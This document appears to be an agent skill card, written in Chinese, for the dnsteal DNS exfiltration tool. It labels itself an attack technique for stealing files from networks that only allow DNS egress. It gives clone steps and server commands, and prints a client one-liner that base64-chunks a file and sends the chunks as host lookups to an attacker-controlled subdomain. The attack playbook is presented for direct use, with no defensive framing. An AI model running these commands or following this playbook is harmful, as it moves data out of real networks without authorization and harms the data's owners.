---
name: dnsteal-dns-exfil
description: dnsteal: 纯 DNS 出网环境偷文件。信号:数据外传,数据泄露,DNS 文件窃取服务端,自定义分块长度,发送端。
---

# dnsteal

- 攻击大类:C37 DNS隧道与利用
- 上游仓库:https://github.com/m57/dnsteal
- 上游 License:GPL-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/m57/dnsteal && cd dnsteal
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python dnsteal.py 10.0.0.5 -z` | DNS 文件窃取服务端 |
| `python dnsteal.py 10.0.0.5 -z -l 63 -f` | 自定义分块长度 |
| `客户端: for b in $(base64 -w 63 file); do host $b.dns.10.0.0.5.nip.io; done` | 发送端 |

## 攻击场景 Playbook

### 纯 DNS 出网环境偷文件

```bash
python dnsteal.py 10.0.0.5 -z
# 客户端 base64 分块打子域,服务端重组出原文件,仅放行 53 端口环境可用
```

## 注意事项

DNS 外带文件工具,零依赖 Python。分块长度需 ≤63 适配 DNS 标签限制。
